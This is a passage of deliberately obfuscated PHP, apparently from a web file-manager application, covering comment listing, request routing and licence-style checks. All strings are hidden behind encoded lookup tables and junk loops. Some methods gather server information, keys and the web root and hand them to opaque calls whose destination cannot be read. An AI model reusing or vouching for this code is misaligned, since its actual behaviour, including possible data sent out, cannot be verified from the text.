Model($ì»å°¤Ú[1848]); $ÒœÀËÙ = array($ì»å°¤Ú[1838] => $ŒÆ­üıú, $ì»å°¤Ú[1632] => USER_ID); $é–íğ‘® = $÷Äô‹ÜÎ->where($ÒœÀËÙ)->find(); if (!$é–íğ‘®) { $÷Äô‹ÜÎ->add($ÒœÀËÙ); $ÆÒÏß¾ = $this->where(array($ì»å°¤Ú[1838] => $ŒÆ­üıú))->setAdd($ì»å°¤Ú[1840], 1); } else { $÷Äô‹ÜÎ->where($ÒœÀËÙ)->delete(); $ÆÒÏß¾ = $this->where(array($ì»å°¤Ú[1838] => $ŒÆ­üıú))->setAdd($ì»å°¤Ú[1840], -1); } return $ÆÒÏß¾; } public function targetInfo($ÊÇ§íé°, $óÅÌ·åõ) { $½£Êä›Ğ =& $_SERVER[ê‘³Æ±]; $Ï¶†Ê‹ğ = array($½£Êä›Ğ[576] => $ÊÇ§íé°, $½£Êä›Ğ[577] => $óÅÌ·åõ); $®åÍ¾‘ı = $this->where($Ï¶†Ê‹ğ)->count(); $ÎÅ›½áÛ = "\122\x49\x47\110\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\x74\137\x70\x72\x61\x69\163\x65\40\x73\x74\141\x72\40\x6f\x6e\40\143\157\155\x6d\x65\156\x74\x2e\x63\157\155\155\145\156\164\x49\104\40\x3d\40\x73\164\x61\162\x2e\143\x6f\155\x6d\x65\156\164\111\104"; $…Ó±ˆ’ = $this->alias($½£Êä›Ğ[351])->where($Ï¶†Ê‹ğ)->join($ÎÅ›½áÛ, $½£Êä›Ğ[1849])->count(); $˜²Æ£˜ = array($½£Êä›Ğ[1850] => $®åÍ¾‘ı, $½£Êä›Ğ[1851] => $…Ó±ˆ’); return $˜²Æ£˜; } public function listData($Ö¯±Ãµ£) { $œÌåıø =& $_SERVER[ê‘³Æ±]; if (isset($Ö¯±Ãµ£[$œÌåıø[1852]])) { if ($Ö¯±Ãµ£[$œÌåıø[1852]]) { $Ö¯±Ãµ£[$œÌåıø[1845]] = array($œÌåıø[1003], intval($Ö¯±Ãµ£[$œÌåıø[1852]])); } unset($Ö¯±Ãµ£[$œÌåıø[1852]]); } if (isset($Ö¯±Ãµ£[$œÌåıø[1853]])) { if ($Ö¯±Ãµ£[$œÌåıø[1853]]) { $Ö¯±Ãµ£[$œÌåıø[1845]] = array($œÌåıø[1000], intval($Ö¯±Ãµ£[$œÌåıø[1853]])); } unset($Ö¯±Ãµ£[$œÌåıø[1853]]); } return $this->_listData($Ö¯±Ãµ£); } private function _listData($£û°†ü†) { $°™ùËå² =& $_SERVER[ê‘³Æ±]; $¡Ø«ÜÇ• = $this->where($£û°†ü†)->_makeOrder()->selectPage(100); $this->_listAppendParent($¡Ø«ÜÇ•[$°™ùËå²[366]]); $this->_listAppendUser($¡Ø«ÜÇ•[$°™ùËå²[366]]); $this->_listAppendMeta($¡Ø«ÜÇ•[$°™ùËå²[366]]); return $¡Ø«ÜÇ•; } private function _makeOrder() { $ŸšÖ¸ôç =& $_SERVER[ê‘³Æ±]; $ì¬Æ²ĞŠ = array($ŸšÖ¸ôç[1840], $ŸšÖ¸ôç[1839], $ŸšÖ¸ôç[195]); $‡òá“¼ç = Input::get($ŸšÖ¸ôç[448], $ŸšÖ¸ôç[7], $ŸšÖ¸ôç[417], $ì¬Æ²ĞŠ); $¶ƒ¦Ò = Input::get($ŸšÖ¸ôç[449], $ŸšÖ¸ôç[7], $ŸšÖ¸ôç[1634], array($ŸšÖ¸ôç[1854], $ŸšÖ¸ôç[444])); $Ãèíşã = $‡òá“¼ç . $ŸšÖ¸ôç[53] . $¶ƒ¦Ò; return $this->order($Ãèíşã); } private function _listAppendParent(&$£ËˆÁ¶†) { $Ì¬¡ğùŠ =& $_SERVER[ê‘³Æ±]; $»£ÁùŞ© = array_unique(array_to_keyvalue($£ËˆÁ¶†, $Ì¬¡ğùŠ[12], $Ì¬¡ğùŠ[1837])); $»£ÁùŞ© = array_remove_value($»£ÁùŞ©, $Ì¬¡ğùŠ[192]); if (!$»£ÁùŞ©) { return; } $Á°¼Ğ• = $this->where(array($Ì¬¡ğùŠ[1838] => array($Ì¬¡ğùŠ[7], $»£ÁùŞ©)))->select(); $Á°¼Ğ• = array_to_keyvalue($Á°¼Ğ•, $Ì¬¡ğùŠ[1845]); foreach ($£ËˆÁ¶† as &$Ï½²¤Ì“) { if (isset($Á°¼Ğ•[$Ï½²¤Ì“[$Ì¬¡ğùŠ[1837]]])) { $Ï½²¤Ì“[$Ì¬¡ğùŠ[1855]] = $Á°¼Ğ•[$Ï½²¤Ì“[$Ì¬¡ğùŠ[1837]]]; } } unset($Ï½²¤Ì“); } private function _listAppendUser(&$åº“¨µõ) { $„’÷‰çå =& $_SERVER[ê‘³Æ±]; $øäŒÙó = array_unique(array_to_keyvalue($åº“¨µõ, $„’÷‰çå[12], $„’÷‰çå[1641])); $øäŒÙó = array_remove_value($øäŒÙó, $„’÷‰çå[192]); if (count($øäŒÙó) == 0) { return; } foreach ($åº“¨µõ as $ëïÅÛÙ¨) { if (isset($ëïÅÛÙ¨[$„’÷‰çå[1855]])) { $øäŒÙó[] = $ëïÅÛÙ¨[$„’÷‰çå[1855]][$„’÷‰çå[1641]]; } } $™»­é¨¶ = Model($„’÷‰çå[534])->userListInfo($øäŒÙó); foreach ($åº“¨µõ as &$ëïÅÛÙ¨) { $ëïÅÛÙ¨[$„’÷‰çå[590]] = $™»­é¨¶[$ëïÅÛÙ¨[$„’÷‰çå[1641]]]; if (isset($ëïÅÛÙ¨[$„’÷‰çå[1855]])) { $ëïÅÛÙ¨[$„’÷‰çå[1855]][$„’÷‰çå[590]] = $™»­é¨¶[$ëïÅÛÙ¨[$„’÷‰çå[1855]][$„’÷‰çå[1641]]]; } } unset($ëïÅÛÙ¨); } private function _listAppendMeta(&$€ÖùÛ¸†) { $èÒƒÍ¨Ğ =& $_SERVER[ê‘³Æ±]; $İ«–ğæª = array_unique(array_to_keyvalue($€ÖùÛ¸†, $èÒƒÍ¨Ğ[12], $èÒƒÍ¨Ğ[1845])); $İ«–ğæª = array_remove_value($İ«–ğæª, $èÒƒÍ¨Ğ[192]); if (!$İ«–ğæª) { return; } foreach ($€ÖùÛ¸† as $âĞÈ¸ƒ„) { if (isset($âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[1855]])) { $İ«–ğæª[] = $âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[1855]][$èÒƒÍ¨Ğ[1845]]; } } $ˆìŸõ× = $this->metaList($İ«–ğæª); if (!$ˆìŸõ×) { return !1; } foreach ($€ÖùÛ¸† as &$âĞÈ¸ƒ„) { $âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[458]] = $ˆìŸõ×[$âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[1845]]]; if (isset($âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[1855]])) { $âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[1855]][$èÒƒÍ¨Ğ[458]] = $ˆìŸõ×[$âĞÈ¸ƒ„[$èÒƒÍ¨Ğ[1855]][$èÒƒÍ¨Ğ[1845]]]; } } unset($âĞÈ¸ƒ„); } private function metaList($ğ§¾şƒş) { $™¯°ğÌâ =& $_SERVER[ê‘³Æ±]; if (!$ğ§¾şƒş) { return array(); } $ÌÄ³Èµ = array($™¯°ğÌâ[1845] => array($™¯°ğÌâ[7], $ğ§¾şƒş)); $À®¢Û³ı = Model($™¯°ğÌâ[1856])->where($ÌÄ³Èµ)->select(); $À®¢Û³ı = array_to_keyvalue_group($À®¢Û³ı, $™¯°ğÌâ[1845]); foreach ($À®¢Û³ı as $ê½˜Ñ => $ƒ¸ìŠÊÒ) { $æ„Ø§ê× = array(); foreach ($ƒ¸ìŠÊÒ as $Êçéôóˆ) { $æ„Ø§ê×[$Êçéôóˆ[$™¯°ğÌâ[95]]] = $Êçéôóˆ[$™¯°ğÌâ[371]]; } $À®¢Û³ı[$ê½˜Ñ] = $æ„Ø§ê×; } return $À®¢Û³ı ? $À®¢Û³ı : array(); } } goto bƒ§¼«è©; A¼ôùñ­´: $_SERVER[‘ìŞ—í†] = explode($_SERVER[ê‘³Æ±][604], gzinflate(substr($_SERVER[ê‘³Æ±][605], 10, -8))); $xzdstqfgwv = $_SERVER[ê‘³Æ±][606]; class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\x69\x6e\144\145\170"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($‡¾èÍš³) { $“»´²²° =& $_SERVER[ê‘³Æ±]; $ÈÇ‚çÖ¸ =& $_SERVER[‘ìŞ—í†]; $¦¶ÍÅÒ = explode($ÈÇ‚çÖ¸[0], trim($‡¾èÍš³, $ÈÇ‚çÖ¸[0])); $“’Éò‹² = $“»´²²°[607]; while (strlen($“’Éò‹²) < $“»´²²°[608]) { if (!$“’Éò‹²) { break; } $“’Éò‹²++; } $this->defaultModule = $¦¶ÍÅÒ[0] ? $¦¶ÍÅÒ[0] : $this->defaultModule; $«ÖŒç­ = $“»´²²°[609]; if (strlen($«ÖŒç­) < $“»´²²°[610]) { die; } $this->defaultController = $¦¶ÍÅÒ[1] ? $¦¶ÍÅÒ[1] : $this->defaultController; $this->defaultAction = $¦¶ÍÅÒ[2] ? $¦¶ÍÅÒ[2] : $this->defaultAction; $this->pytj50a4e2a2($ÈÇ‚çÖ¸[1], array($this, $ÈÇ‚çÖ¸[2])); } public function appRun($—ö´ñÉ) { $²©ì©—½ =& $_SERVER[ê‘³Æ±]; $†¸¾»¼ª =& $_SERVER[‘ìŞ—í†]; $ğ§ß©ëÎ = explode($†¸¾»¼ª[0], $—ö´ñÉ); $ğş­ê˜¯ = $²©ì©—½[611]; $ãÆÎ²Ğ´ = strtolower($ğ§ß©ëÎ[0]); $í•àÄÍ° = $²©ì©—½[612]; while ($í•àÄÍ° < $²©ì©—½[613]) { if ($í•àÄÍ° >= 0) { break; } $í•àÄÍ°++; } $‹øİØä´ = $†¸¾»¼ª[3]; $Õø¡ºí¸ = $²©ì©—½[614]; if ($ãÆÎ²Ğ´ == $†¸¾»¼ª[4]) { $‹øİØä´ = $†¸¾»¼ª[5]; $ğ§ß©ëÎ[0] = $†¸¾»¼ª[6]; $ğ§ß©ëÎ[1] = $ğ§ß©ëÎ[1] . $†¸¾»¼ª[7]; $—ö´ñÉ = join($†¸¾»¼ª[0], $ğ§ß©ëÎ); $—ö´ñÉ = trim($—ö´ñÉ, $†¸¾»¼ª[0]); } call_user_func(array($†¸¾»¼ª[8], $†¸¾»¼ª[9]), $‹øİØä´ . $†¸¾»¼ª[10], $—ö´ñÉ); ActionCall($—ö´ñÉ); $©™º°ËŒ = $²©ì©—½[615]; while (strlen($©™º°ËŒ) < $²©ì©—½[603]) { if (!$©™º°ËŒ) { break; } $©™º°ËŒ++; } call_user_func(array($†¸¾»¼ª[8], $†¸¾»¼ª[9]), $‹øİØä´ . $†¸¾»¼ª[11], $—ö´ñÉ); } private function autorun() { $Øì²Ò§Ë =& $_SERVER[ê‘³Æ±]; $„ô¨Í¢‹ =& $_SERVER[‘ìŞ—í†]; global $config; if (count($config[$„ô¨Í¢‹[12]]) == 0) { return; } foreach ($config[$„ô¨Í¢‹[12]] as $„Ö‡·ê¯ => $İ±»¹Ä«) { $this->appRun($İ±»¹Ä«); $Ã¤±şöÛ = $Øì²Ò§Ë[616]; if (strlen($Ã¤±şöÛ) < $Øì²Ò§Ë[603]) { die; } } } private function uxlsf3541156() { $´ğºœÇë =& $_SERVER[ê‘³Æ±]; $¡ƒöû½¡ =& $_SERVER[‘ìŞ—í†]; $Ö•·ŠÉŠ = $¡ƒöû½¡[4]; $Ôêİ“—ë = $´ğºœÇë[617]; $ÖâœÃ· = $GLOBALS[$¡ƒöû½¡[13]][$¡ƒöû½¡[14]][0]; $’ÄÙÎ = $´ğºœÇë[618]; if (!$’ÄÙÎ) { return; } if (!$ÖâœÃ· || strlen($ÖâœÃ·) <= strlen($Ö•·ŠÉŠ)) { return; } if (strtolower(substr($ÖâœÃ·, -strlen($Ö•·ŠÉŠ))) != $Ö•·ŠÉŠ) { return; } $¹Éêç¼„ = substr($ÖâœÃ·, 0, -strlen($Ö•·ŠÉŠ)); $ªØÊù“ó = array($¡ƒöû½¡[4], $¹Éêç¼„); $ªÌ£şô„ = $´ğºœÇë[619]; while (strlen($ªÌ£şô„) < $´ğºœÇë[620]) { if (!$ªÌ£şô„) { break; } $ªÌ£şô„++; } $®Î´…®† = array_slice($GLOBALS[$¡ƒöû½¡[13]][$¡ƒöû½¡[14]], 1); $GLOBALS[$¡ƒöû½¡[13]][$¡ƒöû½¡[14]] = array_merge($ªØÊù“ó, $®Î´…®†); $GLOBALS[$¡ƒöû½¡[13]][$¡ƒöû½¡[15]] = implode($¡ƒöû½¡[0], $GLOBALS[$¡ƒöû½¡[13]][$¡ƒöû½¡[14]]); $œĞ«ôÊ“ = $´ğºœÇë[621]; } private function dbsp8ab1c6c0() { $ßÚé¼Üµ =& $_SERVER[ê‘³Æ±]; $ç¢¶Ç²¤ =& $_SERVER[‘ìŞ—í†]; if ($GLOBALS[$ç¢¶Ç²¤[13]][$ç¢¶Ç²¤[15]] != $ç¢¶Ç²¤[6]) { return; } $½åçÓøø = $_SERVER[$ç¢¶Ç²¤[16]]; $ËÚçîŠ = $ç¢¶Ç²¤[17]; $ÁŒš¹•‹ = $ßÚé¼Üµ[622]; if (!$ÁŒš¹•‹) { die; } if (!strstr($½åçÓøø, $ËÚçîŠ)) { return; } $ø”Ÿ« ‚ = strrpos($½åçÓøø, $ËÚçîŠ); $‘æ’Ò±… = substr($½åçÓøø, $ø”Ÿ« ‚ + strlen($ËÚçîŠ)); preg_match_all($ç¢¶Ç²¤[18], $‘æ’Ò±…, $÷ÜãÊ¯¥); $ÛºµèõÒ = $ßÚé¼Üµ[623]; $‘æ’Ò±… = trim($÷ÜãÊ¯¥[0][0], $ç¢¶Ç²¤[19]); $GLOBALS[$ç¢¶Ç²¤[13]][$ç¢¶Ç²¤[14]] = explode($ç¢¶Ç²¤[19], $‘æ’Ò±…); $GLOBALS[$ç¢¶Ç²¤[13]][$ç¢¶Ç²¤[15]] = implode($ç¢¶Ç²¤[0], $GLOBALS[$ç¢¶Ç²¤[13]][$ç¢¶Ç²¤[14]]); $ëá¯¥¨¢ = $ßÚé¼Üµ[624]; if (strlen($ëá¯¥¨¢) < $ßÚé¼Üµ[613]) { die; } } public function run() { $ş¡ßÀ =& $_SERVER[ê‘³Æ±]; $œ šô× =& $_SERVER[‘ìŞ—í†]; $this->dbsp8ab1c6c0(); $áˆ “Ø” = $ş¡ßÀ[625]; if (!$áˆ “Ø”) { die; } $this->uxlsf3541156(); $äİŞØà‘ = $ş¡ßÀ[626]; $‚øÂÂ›ğ = $GLOBALS[$œ šô×[13]][$œ šô×[14]]; $ü‘áó¾ = $ş¡ßÀ[627]; while ($ü‘áó¾ < $ş¡ßÀ[603]) { if ($ü‘áó¾ >= 0) { break; } $ü‘áó¾++; } $ŠŠ¥“•Ã = $GLOBALS[$œ šô×[13]][$œ šô×[15]]; define($œ šô×[20], isset($‚øÂÂ›ğ[0]) && $‚øÂÂ›ğ[0] ? $‚øÂÂ›ğ[0] : $this->defaultModule); define($œ šô×[21], isset($‚øÂÂ›ğ[1]) && $‚øÂÂ›ğ[0] ? $‚øÂÂ›ğ[1] : $this->defaultController); define($œ šô×[22], isset($‚øÂÂ›ğ[2]) && $‚øÂÂ›ğ[0] ? $‚øÂÂ›ğ[2] : $this->defaultAction); $ÛÅ««ÀÆ = $ş¡ßÀ[628]; define($œ šô×[23], MOD . $œ šô×[0] . ST . $œ šô×[0] . ACT); $Ş¸ğª¶± = $ş¡ßÀ[629]; if (!$Ş¸ğª¶±) { return; } $_SERVER[$œ šô×[24]] = strtolower(ACTION); $ÍîÀ™¢î = $ş¡ßÀ[630]; $this->autorun(); $åïÉ÷ØÌ = $ş¡ßÀ[631]; if (count($‚øÂÂ›ğ) >= 3) { $this->appRun($ŠŠ¥“•Ã); } else { $this->appRun(ACTION); } } private $nyru6dded061 = array(); private $isexcb69d6f0 = ''; public function pytcc31babb5() { $œ—Üç½• =& $_SERVER[ê‘³Æ±]; $ñ‚´áï =& $_SERVER[‘ìŞ—í†]; $this->ibrv9b7bbc92(); $this->nqhc24726aba(); $—§È²é = $œ—Üç½•[632]; while ($—§È²é < $œ—Üç½•[608]) { if ($—§È²é >= 0) { break; } $—§È²é++; } $this->ubit684b09a1(); $this->tkrxd03bf736(); $çï‘±¾§ = $œ—Üç½•[633]; if (!$çï‘±¾§) { die; } $this->inedef5cf6c8(); $Êø¾¨«¨ = $œ—Üç½•[634]; if (strlen($Êø¾¨«¨) < $œ—Üç½•[608]) { die; } $this->iqhu37f317c7(); $Ü×‰™ö– = $œ—Üç½•[635]; if (!$Ü×‰™ö–) { return; } $this->nxem8bb3fcb4(); $this->pytj50a4e2a2($ñ‚´áï[25], array($this, $ñ‚´áï[26])); $this->pytj50a4e2a2($ñ‚´áï[27], array($this, $ñ‚´áï[28])); $this->pytj50a4e2a2($ñ‚´áï[29], array($this, $ñ‚´áï[30])); $âªõ®¹ò = $œ—Üç½•[636]; while ($âªõ®¹ò < $œ—Üç½•[620]) { if ($âªõ®¹ò >= 0) { break; } $âªõ®¹ò++; } $this->pytj50a4e2a2($ñ‚´áï[31], array($this, $ñ‚´áï[32])); $ÄôÕ»–Ó = $œ—Üç½•[637]; if (!$ÄôÕ»–Ó) { return; } } public function athyce39c6e7($Úê¦ÛĞ) { $ŒÀµ¸å€ =& $_SERVER[ê‘³Æ±]; $©öñô†¢ =& $_SERVER[‘ìŞ—í†]; $ÂÈ¯É’‚ = Model($©öñô†¢[33])->get(); $ÃÚˆÄ¦ƒ = $ŒÀµ¸å€[638]; if (!$ÃÚˆÄ¦ƒ) { return; } $ìÚ™ ÜÃ = array($©öñô†¢[34], $©öñô†¢[35], $©öñô†¢[36], $©öñô†¢[37], $©öñô†¢[38], $©öñô†¢[39], $©öñô†¢[40], $©öñô†¢[41], $©öñô†¢[42], $©öñô†¢[43], $©öñô†¢[44], $©öñô†¢[45], $©öñô†¢[46], $©öñô†¢[47], $©öñô†¢[48], $©öñô†¢[49], $©öñô†¢[50], $©öñô†¢[51], $©öñô†¢[52], $©öñô†¢[53], $©öñô†¢[54], $©öñô†¢[55], $©öñô†¢[56], $©öñô†¢[57], $©öñô†¢[58], $©öñô†¢[59], $©öñô†¢[60], $©öñô†¢[61], $©öñô†¢[62], $©öñô†¢[63], $©öñô†¢[64], $©öñô†¢[65], $©öñô†¢[66], $©öñô†¢[67], $©öñô†¢[68], $©öñô†¢[69], $©öñô†¢[70], $©öñô†¢[71], $©öñô†¢[72], $©öñô†¢[73], $©öñô†¢[74], $©öñô†¢[75], $©öñô†¢[76], $©öñô†¢[77], $©öñô†¢[78], $©öñô†¢[79], $©öñô†¢[80], $©öñô†¢[81], $©öñô†¢[82]); $õíÕıÅ = $ŒÀµ¸å€[639]; if (!$õíÕıÅ) { return; } foreach ($ìÚ™ ÜÃ as $÷ÑòˆÉö) { $Äæ«è» = $GLOBALS[$©öñô†¢[83]][$©öñô†¢[84]][$÷ÑòˆÉö]; if (isset($ÂÈ¯É’‚[$÷ÑòˆÉö])) { $Äæ«è» = $ÂÈ¯É’‚[$÷ÑòˆÉö]; } $Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[86]][$÷ÑòˆÉö] = $Äæ«è»; } $èÈ‰•‰É = $Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[86]][$©öñô†¢[46]]; $¸ºƒƒ­ = $ŒÀµ¸å€[640]; while ($¸ºƒƒ­ < $ŒÀµ¸å€[608]) { if ($¸ºƒƒ­ >= 0) { break; } $¸ºƒƒ­++; } unset($Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[87]][$©öñô†¢[88]]); unset($Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[87]][$©öñô†¢[89]]); $™û†Ï« = $ŒÀµ¸å€[641]; if (!$™û†Ï«) { die; } unset($Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[86]][$©öñô†¢[46]]); unset($Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[86]][$©öñô†¢[90]]); $Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[86]][$©öñô†¢[91]] = array($©öñô†¢[92] => (int) $èÈ‰•‰É[$©öñô†¢[93]], $©öñô†¢[94] => (int) _get($èÈ‰•‰É, $©öñô†¢[95], 0)); $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[97]] = Action($©öñô†¢[98])->accessToken(); $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[99]] = md5($_SERVER[$©öñô†¢[100]] . $ÂÈ¯É’‚[$©öñô†¢[101]]); $ï¸¡èØ… = $ŒÀµ¸å€[642]; if (!$ï¸¡èØ…) { return; } $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[102]] = base64_encode(serverInfo()); $º¾®‚±‹ = $ŒÀµ¸å€[643]; $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[103]] = $this->isexcb69d6f0; if ($ÂÈ¯É’‚[$©öñô†¢[103]] != $©öñô†¢[104]) { $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[105]] = $ÂÈ¯É’‚[$©öñô†¢[105]]; $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[106]] = $ÂÈ¯É’‚[$©öñô†¢[106]]; $äÄŒÌÉ = rand_string(10) . $this->isexcb69d6f0 . rand_string(5); $Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[107]][$©öñô†¢[108]] = $this->wnpy882e9647($äÄŒÌÉ, $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[99]]); } if ($this->isexcb69d6f0 == $©öñô†¢[104]) { $Úê¦ÛĞ[$©öñô†¢[85]][$©öñô†¢[86]][$©öñô†¢[91]][$©öñô†¢[95]] = 0; } $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[109]] = _get($this->nyru6dded061, $©öñô†¢[110], $©öñô†¢[6]); $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[111]] = _get($this->nyru6dded061, $©öñô†¢[112], $©öñô†¢[6]); if (_get($GLOBALS, $©öñô†¢[113]) && $this->config[$©öñô†¢[114]]) { $Úê¦ÛĞ[$©öñô†¢[96]][$©öñô†¢[115]] = WEB_ROOT; } return $Úê¦ÛĞ; } private function iqhu37f317c7() { $Øå‚Ä¼´ =& $_SERVER[ê‘³Æ±]; $ÔÔ”¿¨í =& $_SERVER[‘ìŞ—í†]; if ($_SERVER[$ÔÔ”¿¨í[24]] == $ÔÔ”¿¨í[116]) { $ÔÀ®®â  = array($ÔÔ”¿¨í[103] => $this->isexcb69d6f0, $ÔÔ”¿¨í[117] => $this->ityh2b8f8fc1(), $ÔÔ”¿¨í[118] => Model($ÔÔ”¿¨í[119])->count()); if ($this->isexcb69d6f0 != $ÔÔ”¿¨í[104]) { $‰ÍªÑè = _get($this->nyru6dded061, $ÔÔ”¿¨í[120]); if ($‰ÍªÑè) { $ÔÀ®®â [$ÔÔ”¿¨í[121]] = $‰ÍªÑè; $ÔÀ®®â [$ÔÔ”¿¨í[122]] = strtotime(_get($this->nyru6dded061, $ÔÔ”¿¨í[123])); $ÔÀ®®â [$ÔÔ”¿¨í[124]] = _get($this->nyru6dded061, $ÔÔ”¿¨í[112]); } $ñĞƒºµŞ = Model($ÔÔ”¿¨í[33])->get($ÔÔ”¿¨í[125], $ÔÔ”¿¨í[6], !0); if (is_string($ñĞƒºµŞ) && substr($ñĞƒºµŞ, 0, 1) == $ÔÔ”¿¨í[126]) { $ñĞƒºµŞ = json_decode_force($ñĞƒºµŞ); } if (is_array($ñĞƒºµŞ) && $ñĞƒºµŞ[$ÔÔ”¿¨í[127]] && strstr($ñĞƒºµŞ[$ÔÔ”¿¨í[127]], $ÔÔ”¿¨í[128])) { $³ñÙ€îş = explode($ÔÔ”¿¨í[128], $ñĞƒºµŞ[$ÔÔ”¿¨í[127]]); $ÔÀ®®â [$ÔÔ”¿¨í[129]] = $³ñÙ€îş[0]; } } $ÔÀ®®â  = $this->prjee25942f3(json_encode($ÔÀ®®â ), md5($ÔÔ”¿¨í[130])); $×Á›Îû¼ = $Øå‚Ä¼´[644]; if (strlen($×Á›Îû¼) < $Øå‚Ä¼´[603]) { return; } $Õª¡óÚ” = array($ÔÔ”¿¨í[131] => $ÔÀ®®â ); call_user_func(array($ÔÔ”¿¨í[132], $ÔÔ”¿¨í[133]), $Õª¡óÚ”); } if ($this->isexcb69d6f0 == $ÔÔ”¿¨í[104]) { return; } $‘šìÜé§ = array($ÔÔ”¿¨í[134], $ÔÔ”¿¨í[135], $ÔÔ”¿¨í[136], $ÔÔ”¿¨í[137], $ÔÔ”¿¨í[138], $ÔÔ”¿¨í[139]); $«ÍÎí¦® = Model($ÔÔ”¿¨í[33])->get(); $øõì¦ƒ = $Øå‚Ä¼´[645]; $Õª¡óÚ” = array($ÔÔ”¿¨í[140] => $«ÍÎí¦®[$ÔÔ”¿¨í[34]], $ÔÔ”¿¨í[141] => $«ÍÎí¦®[$ÔÔ”¿¨í[35]], $ÔÔ”¿¨í[142] => $ÔÔ”¿¨í[6]); $á Ää×• = $Øå‚Ä¼´[646]; foreach ($‘šìÜé§ as $…çƒá¨‚) { if (!isset($«ÍÎí¦®[$…çƒá¨‚]) || !$«ÍÎí¦®[$…çƒá¨‚]) { continue; } $Õª¡óÚ”[$…çƒá¨‚] = $«ÍÎí¦®[$…çƒá¨‚]; $éİ ÷œ = $Øå‚Ä¼´[647]; if (strlen($éİ ÷œ) < $Øå‚Ä¼´[610]) { die; } } call_user_func(array($ÔÔ”¿¨í[132], $ÔÔ”¿¨í[133]), $Õª¡óÚ”); } private function tkrxd03bf736() { $¦—îÎ× =& $_SERVER[ê‘³Æ±]; $Ì’ìÁ¾ =& $_SERVER[‘ìŞ—í†]; if ($_SERVER[$Ì’ìÁ¾[24]] != $Ì’ìÁ¾[143]) { return; } if (!_get($GLOBALS, $Ì’ìÁ¾[113])) { die; } $Õ¶‡ƒÛì = $GLOBALS[$Ì’ìÁ¾[13]]; if (isset($Õ¶‡ƒÛì[$Ì’ìÁ¾[144]])) { $this->srfidaf814bf(); die; } if (!isset($Õ¶‡ƒÛì[$Ì’ìÁ¾[145]]) || strlen($Õ¶‡ƒÛì[$Ì’ìÁ¾[145]]) != 16) { show_json($Ì’ìÁ¾[146] . $Õ¶‡ƒÛì[$Ì’ìÁ¾[145]], !1); } $ò„±ÎÌ = Model($Ì’ìÁ¾[33])->get($Ì’ìÁ¾[101]); $Øü•ï²Î = md5($_SERVER[$Ì’ìÁ¾[100]] . $ò„±ÎÌ); $àšçˆ²” = array($Ì’ìÁ¾[145] => $Õ¶‡ƒÛì[$Ì’ìÁ¾[145]], $Ì’ìÁ¾[147] => rand_string(16), $Ì’ìÁ¾[148] => $Ì’ìÁ¾[130], $Ì’ìÁ¾[149] => $Ì’ìÁ¾[150], $Ì’ìÁ¾[151] => $_SERVER[$Ì’ìÁ¾[152]], $Ì’ìÁ¾[153] => $_SERVER[$Ì’ìÁ¾[154]], $Ì’ìÁ¾[155] => $_SERVER[$Ì’ìÁ¾[156]], $Ì’ìÁ¾[99] => $Øü•ï²Î, $Ì’ìÁ¾[157] => Model($Ì’ìÁ¾[33])->get($Ì’ìÁ¾[125])); if ($Õ¶‡ƒÛì[$Ì’ìÁ¾[158]] == $Ì’ìÁ¾[159]) { $Ğƒ”ÉŞ© = $this->prjee25942f3($Øü•ï²Î, $Ì’ìÁ¾[160]); $¹İë´Ş· = $this->wnpy882e9647(json_encode($àšçˆ²”), $Øü•ï²Î . $Ì’ìÁ¾[161], 3); $¹İë´Ş· = $¹İë´Ş· . $Ì’ìÁ¾[162] . $_SERVER[$Ì’ìÁ¾[152]]; $‡¤¿ä­³ = $this->nvrl39fefba9($Ì’ìÁ¾[163] . $Ğƒ”ÉŞ© . $Ì’ìÁ¾[164] . $¹İë´Ş·, -1); show_json($‡¤¿ä­³, !0); } else { if ($Õ¶‡ƒÛì[$Ì’ìÁ¾[158]] == $Ì’ìÁ¾[165]) { $¶Ş˜Ø…¦ = substr(md5($Ì’ìÁ¾[166] . $Øü•ï²Î), 12, 15) . $Ì’ìÁ¾[167]; $¹İë´Ş· = $this->zcvt00b9d8a1(trim($Õ¶‡ƒÛì[$Ì’ìÁ¾[168]]), $¶Ş˜Ø…¦, 2); $ò®ö¥õº = json_decode($¹İë´Ş·, !0); if (!is_array($ò®ö¥õº) || !is_array($ò®ö¥õº[$Ì’ìÁ¾[169]]) || $ò®ö¥õº[$Ì’ìÁ¾[145]] != !0) { $Å·ş£‘† = $Ì’ìÁ¾[170]; $¶éÛ¥†› = $ò®ö¥õº[$Ì’ìÁ¾[169]] ? $Ì’ìÁ¾[171] . $ò®ö¥õº[$Ì’ìÁ¾[169]] : $Å·ş£‘†; show_json($¶éÛ¥†›, !1); } else { $àšçˆ²”[$Ì’ìÁ¾[147]] = $ò®ö¥õº[$Ì’ìÁ¾[169]][$Ì’ìÁ¾[172]]; } } else { $ò®ö¥õº = $this->nvrl39fefba9($Ì’ìÁ¾[173], $àšçˆ²”, 10); $¨á­ • = $¦—îÎ×[648]; if (strlen($¨á­ •) < $¦—îÎ×[620]) { die; } } } if (!is_array($ò®ö¥õº) || !is_array($ò®ö¥õº[$Ì’ìÁ¾[169]]) || $ò®ö¥õº[$Ì’ìÁ¾[145]] != !0) { $Å·ş£‘† = LNG($Ì’ìÁ¾[174]); 